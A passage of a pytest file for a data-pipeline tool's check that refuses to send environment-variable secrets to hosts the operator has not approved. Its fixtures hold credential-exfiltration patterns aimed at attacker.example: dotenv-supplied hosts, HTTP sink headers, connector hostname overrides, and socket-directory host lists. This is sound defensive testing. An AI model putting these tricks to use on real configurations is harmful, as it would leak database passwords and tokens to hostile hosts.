        "FROM_PROJECT=attacker.example\nFROM_SHELL=attacker.example\nFROM_OPERATOR_FILE=attacker.example\n",
    )
    assert os.environ["FROM_PROJECT"] == "attacker.example"
    assert os.environ["FROM_SHELL"] == "db.shell.example"
    assert os.environ["FROM_OPERATOR_FILE"] == "db.opsfile.example"
    assert project_value_in_effect("FROM_PROJECT") is True
    assert project_value_in_effect("FROM_SHELL") is False
    assert project_value_in_effect("FROM_OPERATOR_FILE") is False
    assert project_value_in_effect("NEVER_SET") is False


@pytest.mark.parametrize(
    "connection",
    [
        {"host": "{{ env.ZZZ }}"},
        {"host": "{{ env.ZZZ }}:5432"},
        {"host": "u@{{ env.ZZZ }}:5432"},
        {"uri": "postgres://u@{{ env.ZZZ }}:5432/db"},
        {"uri": "postgres://u:{{ env.DB_PW }}@{{ env.ZZZ }}/db"},
        {"connection_string": "postgres://{{ env.ZZZ }}/db"},
    ],
)
def test_every_form_of_a_project_supplied_host_is_judged_as_the_host_it_renders_to(
    connection, project: Path
):
    _hydrate(project, "ZZZ=attacker.example\n")
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({**connection, "password": "{{ env.DB_PW }}"})

    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract, stage="fluid apply")

    error = info.value
    assert error.code == "EnvTemplateHostError" and error.extras["reason"] == "unpaired"
    assert error.extras["origin"] == "project-dotenv" and error.extras["host_variable"] == "ZZZ"
    assert "project dotenv" in error.what and "export ZZZ" in error.fix
    assert "attacker.example" not in repr(error.__dict__) and _PROBE not in repr(error.__dict__)


def test_a_project_supplied_host_in_a_url_or_a_host_field_is_paired_like_any_other(
    project: Path, monkeypatch
):
    _hydrate(project, "ZZZ=attacker.example\n")
    values = [
        {"host": "{{ env.ZZZ }}"},
        {"url": "https://{{ env.ZZZ }}/catalog"},
        {"endpoint": "{{ env.ZZZ }}:9092"},
    ]
    for value in values:
        with pytest.raises(EnvTemplateError) as info:
            check_host_templates(value, stage="fluid apply")
        error = info.value
        assert error.code == "EnvTemplateHostError" and error.extras["variable"] == "ZZZ"
        assert error.extras["reason"] == "unpaired" and error.extras["origin"] == "project-dotenv"
        assert "project dotenv" in error.what and "Export ZZZ" in error.fix
        assert "ZZZ@" in error.fix and "attacker.example" not in repr(error.__dict__)

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
    for value in values:
        check_host_templates(value)


def test_a_host_variable_the_operator_holds_needs_no_pairing_in_a_url_or_a_host_field(
    project: Path, monkeypatch
):
    monkeypatch.setenv("ZZZ", "db.internal")
    _hydrate(project, "ZZZ=attacker.example\n")
    check_host_templates({"host": "{{ env.ZZZ }}", "url": "https://{{ env.ZZZ }}/catalog"})


def test_the_refusal_names_the_host_variable_for_a_variable_sent_to_it(project: Path, monkeypatch):
    _hydrate(project, "ZZZ=attacker.example\n")
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(_picks_the_host(_contract()), stage="fluid apply")
    error = info.value
    assert error.extras["variable"] == "DB_PW" and error.extras["host_variable"] == "ZZZ"
    assert error.extras["origin"] == "project-dotenv"
    assert "ZZZ, which a project dotenv file supplied" in error.what
    assert "export ZZZ" in error.fix and "DB_PW@" in error.fix
    assert error.where == "builds[0].properties.source.connection.password"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
    check_env_pairing(_picks_the_host(_contract()))


def test_a_tunnel_through_a_bastion_a_project_dotenv_names_is_refused(project: Path, monkeypatch):
    """The operator's own bastion needs no pairing; one the project's file picks does."""
    monkeypatch.setenv("H", "db.internal")
    _hydrate(project, "B=bastion.attacker.example\n")
    contract = _contract(
        host="{{ env.H }}",
        ssh_tunnel={"enable": True, "host": "{{ env.B }}"},
        password="{{ env.DB_PW }}",
    )
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["origin"] == "project-dotenv"
    assert info.value.extras["host_variable"] == "B"
    assert "bastion.attacker.example" not in repr(info.value.__dict__) + str(info.value)


def test_an_address_the_policy_does_not_read_is_the_operators_only_while_the_value_is(
    project: Path, monkeypatch
):
    """``brokers: "{{ env.BROKERS }}"`` is the operator's address when they hold BROKERS; a value
    the project's file supplied is an address the contract picked, which only a bare entry clears.
    """
    contract = _airbyte_contract({"brokers": "{{ env.BROKERS }}", "password": "{{ env.DB_PW }}"})
    monkeypatch.setenv("BROKERS", "kafka.internal:9092")
    check_env_pairing(contract)

    monkeypatch.delenv("BROKERS")
    _hydrate(project, "BROKERS=kafka.attacker.example:9092\n")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "brokers" in info.value.what and "any host" in info.value.fix
    assert "kafka.attacker.example" not in repr(info.value.__dict__) + str(info.value)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "BROKERS,DB_PW")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "value",
    [
        {"host": "db.example:{{ env.V }}"},  # a port
        {"host": "{{ env.V }}.example"},  # text beside it
        {"url": "postgres://{{ env.V }}@db.example/x"},  # userinfo
    ],
)
def test_only_the_whole_host_variable_is_blamed_on_the_project_and_told_to_export(
    value, project: Path, monkeypatch
):
    """A port, a user name or text beside it is paired whoever supplied it: exporting the variable
    does not clear that, so the refusal does not say it does."""
    _hydrate(project, "V=9999\n")
    for _ in range(2):  # from the project's file, then exported by the operator as well
        with pytest.raises(EnvTemplateError) as info:
            check_host_templates(value, stage="fluid apply")
        error = info.value
        assert error.extras["reason"] == "unpaired" and "origin" not in error.extras
        assert "project dotenv" not in error.what and "Export" not in error.fix
        assert "V@" in error.fix
        monkeypatch.setenv("V", "9999")


def test_the_refusal_for_an_address_the_policy_cannot_read_names_the_projects_variable(
    project: Path, monkeypatch
):
    """``db_host`` is read by nobody, so the entry for the host it holds is not enough: the next
    refusal is the one that asks for any host, and it tells the operator what makes the address
    theirs (a variable that is already one placeholder cannot be written as one)."""
    _hydrate(project, "ZZZ=attacker.example\n")
    contract = _airbyte_contract({"db_host": "{{ env.ZZZ }}", "password": "{{ env.DB_PW }}"})
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    error = info.value
    assert error.extras["origin"] == "project-dotenv" and error.extras["host_variable"] == "ZZZ"
    assert "ZZZ, which a project dotenv file supplied" in error.what
    assert "export ZZZ" in error.fix and "one {{ env.* }} placeholder" not in error.fix
    assert "attacker.example" not in repr(error.__dict__) + str(error)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ,DB_PW")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "value", ["/data/x.db", "/v1/users", "sqlite:////data/x.db", "s3://bucket/x"]
)
def test_a_project_value_that_names_no_host_is_not_judged_as_one(value, project: Path):
    """A path, a local database and a bucket name no host, written out or held by a variable."""
    _hydrate(project, f"PROJV={value}\n")
    check_host_templates({"uri": "{{ env.PROJV }}", "endpoint": "{{ env.PROJV }}"})
    check_env_pairing(
        _airbyte_contract({"db_host": "{{ env.PROJV }}", "password": "{{ env.DB_PW }}"})
    )


@pytest.mark.parametrize("value", ["https://attacker.example/x", "attacker.example:5432"])
def test_a_project_value_that_names_a_host_is_judged_by_that_host(
    value, project: Path, monkeypatch
):
    _hydrate(project, f"PROJV={value}\n")
    with pytest.raises(EnvTemplateError) as info:
        check_host_templates({"uri": "{{ env.PROJV }}"}, stage="fluid apply")
    assert (
        info.value.extras["variable"] == "PROJV" and info.value.extras["origin"] == "project-dotenv"
    )
    assert "attacker.example" not in repr(info.value.__dict__) + str(info.value)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "PROJV@attacker.example")
    check_host_templates({"uri": "{{ env.PROJV }}"})


# The real command: ``fluid apply``'s own ``run`` reads the working directory's ``.env`` with the
# real ``hydrate_dotenv``, then reaches the dispatcher.


def _apply(project: Path, contract: Dict[str, Any], monkeypatch) -> int:
    import yaml

    from fluid_build.cli.apply import register as register_apply
    from fluid_build.cli.apply import run as apply_run

    kafka_connect = contract["builds"][0]["properties"].get("kafka-connect")
    if kafka_connect is not None:  # what the schema asks of a worker the operator runs
        kafka_connect["deployment"].setdefault("mode", "bring-your-own")
    path = project / "contract.fluid.yaml"
    path.write_text(yaml.safe_dump(contract, sort_keys=False), encoding="utf-8")
    monkeypatch.chdir(project)
    parser = argparse.ArgumentParser(prog="fluid")
    parser.add_argument("--env", default=None)
    register_apply(parser.add_subparsers(dest="cmd"))
    args = parser.parse_args(["apply", str(path), "--mode", "amend-and-build"])
    return apply_run(args, logging.getLogger("test.env_pairing.apply"))


def test_apply_refuses_a_host_the_project_dotenv_picks(
    engine, project: Path, monkeypatch, capsys, caplog
):
    contract_for, pushed = engine
    _dotenv(project, "ZZZ=attacker.example\n")
    contract = _picks_the_host(contract_for())

    with caplog.at_level(logging.DEBUG):
        rc = _apply(project, contract, monkeypatch)

    shown = capsys.readouterr()
    everything = shown.out + shown.err + caplog.text
    assert os.environ.get("ZZZ") == "attacker.example", "apply loaded the project's file"
    assert rc == 1
    assert "ZZZ" in everything and "project dotenv" in everything
    assert "attacker.example" not in everything + pushed(), "neither printed nor started"
    assert _PROBE not in everything + pushed()


def test_apply_runs_a_host_the_operator_exports(engine, project: Path, monkeypatch):
    contract_for, pushed = engine
    monkeypatch.setenv("ZZZ", "db.internal")
    _dotenv(project, "ZZZ=attacker.example\n")  # the project's file does not replace it
    contract = _picks_the_host(contract_for())

    assert _apply(project, contract, monkeypatch) == 0
    assert "db.internal" in pushed() and "attacker.example" not in pushed()


# ── the maps of an engine's own settings that a contract writes by hand ─────
#
# A runner pushes ``sink_connector_config`` (Kafka Connect), ``server.sink.config`` (Debezium Server),
# ``extra_config`` (Debezium), ``target_config`` (Meltano) and ``destination_config`` (Airbyte) as they
# are, merged over what it derives. ``{http.api.url: https://attacker.example/x, headers: "{{ env.X }}"}``
# sent X to attacker.example, and no block the check judged named a variable beside that host.


def _writes_a_sink_config(contract: Dict[str, Any]) -> str:
    """Give the contract a hand-written sink config for its engine: the URL it sends to, and a
    variable ``X`` beside it. The expose names no endpoint, so the map is the only destination.
    Returns the field that holds the URL."""
    build = contract["builds"][0]
    props = build["properties"]
    props["sink"] = {"format": "json"}
    contract["exposes"][0]["binding"]["location"] = {"path": "./out"}
    url = "https://attacker.example/x"
    if build["engine"] == "kafka-connect":
        props["kafka-connect"]["sink_connector_config"] = {
            "connector.class": "io.confluent.connect.http.HttpSinkConnector",
            "topics": "public.orders",
            "http.api.url": url,
            "headers": "{{ env.X }}",
        }
        return "sink_connector_config.http.api.url"
    props["debezium"]["server"]["sink"] = {
        "type": "http",
        "config": {"url": url, "headers": "{{ env.X }}"},
    }
    return "server.sink.config.url"


@_SHAPES
def test_a_variable_in_a_hand_written_sink_config_goes_with_the_url_it_names(
    engine, tmp_path: Path, monkeypatch, capsys, caplog, shape
):
    contract_for, pushed = engine
    monkeypatch.setenv("X", _PROBE)
    contract = contract_for()
    field = _writes_a_sink_config(contract)

    with caplog.at_level(logging.DEBUG):
        rc = _run(contract, tmp_path, shape)

    shown = capsys.readouterr()
    everything = shown.out + shown.err + caplog.text
    assert rc == 1
    assert "{{ env.X }}" in everything, "the refusal names the variable"
    assert "attacker.example" in everything and field in everything, "the URL and its field"
    assert (
        "FLUID_ACQUISITION_SECRET_REF_ALLOWLIST" in everything
        and "X@attacker.example" in everything
    )
    assert _PROBE not in everything + pushed(), "never the value"
    assert "attacker.example" not in pushed(), "nothing was started"


@_SHAPES
def test_the_operator_pairs_a_variable_with_the_url_a_hand_written_sink_config_names(
    engine, tmp_path: Path, monkeypatch, shape
):
    contract_for, pushed = engine
    monkeypatch.setenv("X", _PROBE)
    contract = contract_for()
    _writes_a_sink_config(contract)

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@elsewhere.example")
    assert _run(contract, tmp_path, shape) == 1, "a pairing with another host does not count"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@attacker.example")
    assert _run(contract, tmp_path, shape) == 0
    assert "attacker.example" in pushed() and _PROBE in pushed(), "the operator chose it"


_MAPS = [
    ("debezium", ("debezium", "extra_config")),
    ("debezium", ("debezium", "server", "sink", "config")),
    ("kafka-connect", ("kafka-connect", "sink_connector_config")),
    ("kafka-connect", ("kafka-connect", "iceberg_catalog_overrides")),
    ("meltano", ("meltano", "target_config")),
    ("airbyte", ("airbyte", "destination_config")),
    ("kafka-connect", ("kafka-connect", "schema_registry")),
]
_MAP_IDS = [".".join(path) for _engine, path in _MAPS]


def _with_a_map(
    engine_name: str, path: Tuple[str, ...], config: Any, **source: Any
) -> Dict[str, Any]:
    """A contract whose build holds ``config`` at ``path`` under its properties. The source names
    this machine, so only the map holds an endpoint a variable could go to."""
    properties: Dict[str, Any] = {
        "source": {"kind": "postgres", "connection": {"host": "localhost", **source}}
    }
    node = properties
    for key in path[:-1]:
        node = node.setdefault(key, {})
    node[path[-1]] = config
    return {
        "builds": [{"id": "b", "engine": engine_name, "properties": properties}],
        "exposes": [{"exposeId": "data", "binding": {"location": {"path": "./out/x.parquet"}}}],
    }


@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
def test_every_hand_written_engine_map_is_judged_by_the_urls_it_names(
    engine_name, path, monkeypatch
):
    config = {"url": "https://attacker.example/x", "headers": "{{ env.X }}"}
    contract = _with_a_map(engine_name, path, config)
    monkeypatch.setenv("X", _PROBE)

    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract, stage="fluid apply")

    error = info.value
    assert error.code == "EnvTemplateHostError" and error.extras["reason"] == "unpaired"
    assert error.extras["variable"] == "X" and error.extras["entry"] == "X@attacker.example"
    assert error.where == f"builds[0].properties.{'.'.join(path)}.headers"
    assert f"{'.'.join(path)}.url" in error.what and "host 'attacker.example'" in error.what
    assert _PROBE not in repr(error.__dict__)

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@elsewhere.example")
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, error.extras["entry"])
    check_env_pairing(contract)


@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
def test_a_hand_written_engine_map_that_names_this_machine_or_the_operators_host_needs_no_pairing(
    engine_name, path, monkeypatch
):
    monkeypatch.setenv("X", _PROBE)
    monkeypatch.setenv("SINK_HOST", "sink.internal")
    for config in (
        {"url": "http://localhost:8083/x", "headers": "{{ env.X }}"},
        {"url": "https://{{ env.SINK_HOST }}/x", "headers": "{{ env.X }}"},
        {"tasks.max": "1", "headers": "{{ env.X }}"},  # names no endpoint at all
    ):
        check_env_pairing(_with_a_map(engine_name, path, config))


@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
def test_a_hand_written_engine_map_is_the_projects_choice_when_its_host_variable_is(
    engine_name, path, project: Path, monkeypatch
):
    monkeypatch.delenv("SINK_HOST", raising=False)
    _hydrate(project, "SINK_HOST=sink.attacker.example\n")
    contract = _with_a_map(
        engine_name, path, {"url": "https://{{ env.SINK_HOST }}/x", "headers": "{{ env.X }}"}
    )
    monkeypatch.setenv("X", _PROBE)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["origin"] == "project-dotenv"
    assert "sink.attacker.example" not in repr(info.value.__dict__)


@pytest.mark.parametrize(
    "value",
    [
        "https://attacker.example/x {{ env.X }}",
        ["https://attacker.example/x", "{{ env.X }}", "z"],
        [1, 2],
        5,
    ],
    ids=["string", "list of three", "list of numbers", "number"],
)
@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
def test_what_is_not_a_map_is_left_alone(engine_name, path, value, monkeypatch):
    """What no runner can merge fails there. The same URL and variable in a map are refused, so this
    is not a pass for want of anything to judge."""
    monkeypatch.setenv("X", _PROBE)
    as_a_map = {"url": "https://attacker.example/x", "headers": "{{ env.X }}"}
    with pytest.raises(EnvTemplateError):
        check_env_pairing(_with_a_map(engine_name, path, as_a_map))
    check_env_pairing(_with_a_map(engine_name, path, value))


def test_a_variable_in_the_source_does_not_go_to_the_sinks_url_and_the_other_way_round(
    monkeypatch,
):
    """The source and the sink are two destinations: each variable goes where its own side sends."""
    contract = _with_a_map(
        "kafka-connect",
        ("kafka-connect", "sink_connector_config"),
        {"http.api.url": "https://sink.example/x", "headers": "{{ env.SINK_TOKEN }}"},
        host="db.example",
        password="{{ env.DB_PW }}",
    )
    monkeypatch.setenv("SINK_TOKEN", _PROBE)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@db.example,SINK_TOKEN@sink.example")
    check_env_pairing(contract)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@db.example")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["variable"] == "SINK_TOKEN"
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "SINK_TOKEN@sink.example")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["variable"] == "DB_PW"


def test_the_sources_password_does_not_go_to_the_brokers_the_extra_config_names(monkeypatch):
    """The canonical use of ``extra_config``: the Kafka brokers of the schema history. They get no
    database password, so the source's variables need no entry for them."""
    contract = _with_a_map(
        "debezium",
        ("debezium", "extra_config"),
        {
            "schema.history.internal.kafka.bootstrap.servers": "kafka:9092",
            "schema.history.internal.kafka.topic": "history",
        },
        password="{{ env.PGPASSWORD }}",
    )
    monkeypatch.setenv("PGPASSWORD", _PROBE)
    check_env_pairing(contract)


def test_a_variable_in_the_extra_config_goes_with_the_addresses_the_extra_config_names(monkeypatch):
    jaas = 'PlainLoginModule required username="u" password="{{ env.KAFKA_PW }}";'
    contract = _with_a_map(
        "debezium",
        ("debezium", "extra_config"),
        {
            "schema.history.internal.kafka.bootstrap.servers": "kafka.attacker.example:9092",
            "schema.history.internal.producer.sasl.jaas.config": jaas,
        },
    )
    monkeypatch.setenv("KAFKA_PW", _PROBE)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "bootstrap.servers" in info.value.what and "any host" in info.value.fix
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "KAFKA_PW")
    check_env_pairing(contract)


def test_a_credential_the_extra_config_gives_the_connector_goes_with_the_sources_host(monkeypatch):
    """``database.password`` in ``extra_config`` replaces the one built from the source, and is sent
    to the source's host."""
    contract = _with_a_map(
        "debezium",
        ("debezium", "extra_config"),
        {"database.password": "{{ env.OTHER_PW }}"},
        host="db.example",
    )
    monkeypatch.setenv("OTHER_PW", _PROBE)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["variable"] == "OTHER_PW" and "db.example" in info.value.what
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "OTHER_PW@db.example")
    check_env_pairing(contract)


def test_a_converter_setting_of_the_sink_config_goes_with_the_schema_registry(
    kafka_connect_mock, tmp_path: Path, monkeypatch, capsys
):
    """The registry's URL is copied into the sink connector config, and a hand-written
    ``value.converter.*`` key is the converter's, which sends it to the registry."""
    monkeypatch.setenv("X", _PROBE)
    contract = _kc_contract(
        None,
        location=_catalog("http://localhost:8181/catalog"),
        schema_registry={"url": "https://attacker.example"},
        iceberg_sink_enabled=True,
        sink_connector_config={
            "value.converter.basic.auth.credentials.source": "USER_INFO",
            "value.converter.basic.auth.user.info": "{{ env.X }}",
        },
    )

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert (
        "schema_registry.url" in shown.out + shown.err
        and "X@attacker.example" in shown.out + shown.err
    )
    assert _PROBE not in shown.out + shown.err + repr(kafka_connect_mock.connectors)
    assert kafka_connect_mock.connectors == {}, "nothing was pushed"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@attacker.example")
    assert _dispatch(contract, tmp_path) == 0
    assert _PROBE in repr(kafka_connect_mock.connectors), "the operator decides"


def test_a_converter_setting_of_a_passed_through_source_goes_with_the_schema_registry(
    kafka_connect_mock, tmp_path: Path, monkeypatch, capsys
):
    """A source kind that is no JDBC kind has its connection pushed as the connector config, the
    registry's URL beside it, so its ``value.converter.*`` keys reach the registry too."""
    monkeypatch.setenv("X", _PROBE)
    contract = _kc_contract(
        None,
        location=_catalog("http://localhost:8181/catalog"),
        schema_registry={"url": "https://attacker.example"},
        connector_class="io.confluent.connect.http.HttpSourceConnector",
    )
    contract["builds"][0]["properties"]["source"] = {
        "kind": "http",
        "connection": {
            "value.converter.basic.auth.credentials.source": "USER_INFO",
            "value.converter.basic.auth.user.info": "{{ env.X }}",
        },
        "mode": "full_refresh",
        "streams": ["events"],
    }

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert (
        "schema_registry.url" in shown.out + shown.err
        and "X@attacker.example" in shown.out + shown.err
    )
    assert _PROBE not in shown.out + shown.err + repr(kafka_connect_mock.connectors)
    assert kafka_connect_mock.connectors == {}, "nothing was pushed"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@attacker.example")
    assert _dispatch(contract, tmp_path) == 0
    assert _PROBE in repr(kafka_connect_mock.connectors), "the operator decides"


def test_the_other_settings_of_the_sink_config_do_not_go_to_the_schema_registry(monkeypatch):
    contract = _kc_contract(
        None,
        location=_catalog("http://localhost:8181/catalog"),
        schema_registry={"url": "https://schema-registry.example:8081"},
        iceberg_sink_enabled=True,
        sink_connector_config={"iceberg.catalog.warehouse": "{{ env.WH }}"},
    )
    monkeypatch.setenv("WH", _PROBE)
    check_env_pairing(contract)  # WH goes to the catalog, which is this machine


def test_a_destination_airbyte_is_given_is_judged_on_its_own(monkeypatch):
    """``destination_config`` replaces what Airbyte would derive: it is a destination of its own,
    and no variable of the source goes there."""
    contract = _with_a_map(
        "airbyte",
        ("airbyte", "destination_config"),
        {"host": "dest.example", "password": "{{ env.DEST_PW }}"},
        password="{{ env.DB_PW }}",
    )
    monkeypatch.setenv("DEST_PW", _PROBE)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DEST_PW@dest.example")
    check_env_pairing(contract)  # DB_PW goes to this machine, DEST_PW to dest.example
    monkeypatch.delenv(SECRET_REF_ALLOWLIST)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["variable"] == "DEST_PW"
    assert "destination_config.host" in info.value.what


def test_a_variable_in_the_schema_registry_url_goes_with_its_host(
    kafka_connect_mock, tmp_path: Path, monkeypatch, capsys
):
    """The registry's URL is copied into the source and the sink config, so a variable in its path
    or query is sent to the host it names, whatever the variable is called."""
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = _kc_contract(
        None,
        location=_catalog(_CATALOG_URI),
        schema_registry={"url": "https://attacker.example/{{ env.DB_PW }}"},
    )

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert (
        "schema_registry.url" in shown.out + shown.err
        and "DB_PW@attacker.example" in shown.out + shown.err
    )
    assert _PROBE not in shown.out + shown.err + repr(kafka_connect_mock.connectors)
    assert kafka_connect_mock.connectors == {}, "nothing was pushed"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@attacker.example")
    assert _dispatch(contract, tmp_path) == 0, "the operator decides"
    assert f"https://attacker.example/{_PROBE}" in repr(kafka_connect_mock.connectors)


@pytest.mark.parametrize(
    "pairs",
    [
        [["schema.registry.url", "https://attacker.example/x"], ["headers", "{{ env.X }}"]],
        [("schema.registry.url", "https://attacker.example/x"), ("headers", "{{ env.X }}")],
    ],
)
def test_a_list_of_pairs_is_merged_as_a_map_so_it_is_judged_as_one(pairs, monkeypatch):
    """``dict.update`` takes pairs too: Debezium's ``extra_config`` as a list reaches the connector."""
    contract = _with_a_map("debezium", ("debezium", "extra_config"), pairs)
    monkeypatch.setenv("X", _PROBE)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["entry"] == "X@attacker.example"
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@attacker.example")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "pairs",
    [
        ["https://attacker.example/x", "{{ env.X }}", "z"],
        [1, 2],
        [["https://attacker.example/x"]],
        [["url", "https://attacker.example/x", "{{ env.X }}"]],
    ],
)
def test_a_list_that_is_no_list_of_pairs_is_left_to_the_runner(pairs, monkeypatch):
    monkeypatch.setenv("X", _PROBE)
    check_env_pairing(_with_a_map("debezium", ("debezium", "extra_config"), pairs))


def test_a_connect_mode_extra_config_that_moves_the_host_gets_the_sources_variables(
    kafka_connect_mock, tmp_path: Path, monkeypatch, capsys
):
    """Connect-mode Debezium merges ``extra_config`` over the settings it builds from the source, so
    ``database.hostname`` in it, as a map or as pairs, sends the source's password to that host."""
    monkeypatch.setenv("DB_PW", _PROBE)
    for extra in (
        {"database.hostname": "attacker.example"},
        [["database.hostname", "attacker.example"]],
    ):
        contract = _dbz_contract(None, location=_catalog(_CATALOG_URI))
        props = contract["builds"][0]["properties"]
        props["source"]["connection"].update({"host": "localhost", "password": "{{ env.DB_PW }}"})
        props["debezium"] = {
            "deployment": {
                "mode": "bring-your-own",
                "server_url": "http://kafka-connect.test:8083",
            },
            "extra_config": extra,
        }
        monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
        assert _dispatch(contract, tmp_path) == 1
        shown = capsys.readouterr()
        assert "extra_config.database.hostname" in shown.out + shown.err
        assert _PROBE not in shown.out + shown.err + repr(kafka_connect_mock.connectors)
        assert kafka_connect_mock.connectors == {}, "nothing was pushed"

        monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")  # a host the policy reads no name for
        assert _dispatch(contract, tmp_path) == 0
        assert "attacker.example" in repr(kafka_connect_mock.connectors)
        kafka_connect_mock.connectors.clear()


def test_a_catalog_the_hand_written_config_points_elsewhere_gets_the_variables_of_the_expose(
    monkeypatch,
):
    """The hand-written config is merged over what the runner derives from the expose, so its
    ``iceberg.catalog.uri`` can send the expose's ``warehouse`` variable to a catalog of its own."""
    contract = _kc_contract(
        None,
        location={**_catalog(_CATALOG_URI), "warehouse": "{{ env.WAREHOUSE }}"},
        sink_connector_config={"iceberg.catalog.uri": "https://catalog.attacker.example/catalog"},
    )
    monkeypatch.setenv("WAREHOUSE", _PROBE)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "WAREHOUSE@lakekeeper")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "catalog.attacker.example" in info.value.what
    assert info.value.extras["variable"] == "WAREHOUSE"
    monkeypatch.setenv(
        SECRET_REF_ALLOWLIST, "WAREHOUSE@lakekeeper,WAREHOUSE@catalog.attacker.example"
    )
    check_env_pairing(contract)


# ── a socket directory beside a host is a list ───────────────────────────────
#
# libpq reads ``host`` as a list: ``/sockdir,attacker.example`` is a socket directory, and then a TCP
# host that gets the password. The DuckDB runner's ATTACH, psycopg2 under Meltano's tap-postgres
# (``URL.create(host=...)``, from the tap config the Meltano runner writes from the source connection)
# and the other runners that hand ``host`` on read it that way, so a path in one element hides no host
# in another.


def _list_contract(host: str, engine_name: str = "airbyte") -> Dict[str, Any]:
    contract = _airbyte_contract({"host": host, "password": "{{ env.DB_PW }}"})
    contract["builds"][0]["engine"] = engine_name
    return contract


def _fake_runner(monkeypatch, engine_name: str) -> List[Any]:
    """Stand in for an engine's runner and record the builds it is handed."""
    import importlib

    from fluid_build.build_runners.base import _ACQUISITION_RUNNER_REGISTRY

    module_path, function_name = _ACQUISITION_RUNNER_REGISTRY[engine_name]
    module = importlib.import_module(module_path, package="fluid_build.build_runners")
    calls: List[Any] = []

    def fake(build, contract, contract_dir, *, dry_run, sample_rows=None, **_kwargs):
        calls.append(build)
        return 0

    monkeypatch.setattr(module, function_name, fake)
    return calls


@pytest.mark.parametrize(
    "host",
    [
        "/sockdir,attacker.example",
        "attacker.example,/sockdir",
        "/a,/b,attacker.example",
        "/sockdir , attacker.example ",
    ],
)
def test_a_socket_directory_beside_a_host_is_a_list_whose_host_is_judged(host, monkeypatch):
    contract = _list_contract(host)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract, stage="fluid apply")
    error = info.value
    assert error.extras["variable"] == "DB_PW" and error.extras["entry"] == "DB_PW@attacker.example"
    assert "host 'attacker.example'" in error.what and _PROBE not in repr(error.__dict__)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, error.extras["entry"])
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "host",
    [
        "/var/run/postgresql",
        "/var/run/postgresql,/tmp",
        "/sockdir,127.0.0.1",
        "/sockdir,",
        "/a ,/b",
    ],
)
def test_a_socket_directory_alone_or_beside_this_machine_needs_no_pairing(host):
    check_env_pairing(_list_contract(host))
    check_host_templates(_list_contract(host))


@pytest.mark.parametrize(
    "dotenv_value, host, says_so",
    [
        ("/tmp,attacker.example", "{{ env.ZZZ }}", True),
        ("attacker.example", "/tmp,{{ env.ZZZ }}", False),  # a list, not one whole variable
    ],
    ids=["the whole host", "beside a socket directory"],
)
def test_a_project_dotenv_cannot_hide_a_host_behind_a_socket_directory(
    dotenv_value, host, says_so, project: Path, monkeypatch
):
    """The project's file supplies the list, or the host beside the socket directory."""
    _hydrate(project, f"ZZZ={dotenv_value}\n")
    contract = _list_contract(host)

    def both() -> None:
        check_host_templates(contract, stage="fluid apply")
        check_env_pairing(contract, stage="fluid apply")

    with pytest.raises(EnvTemplateError) as info:
        both()
    assert ("origin" in info.value.extras) is says_so
    assert "attacker.example" not in repr(info.value.__dict__) + str(info.value)
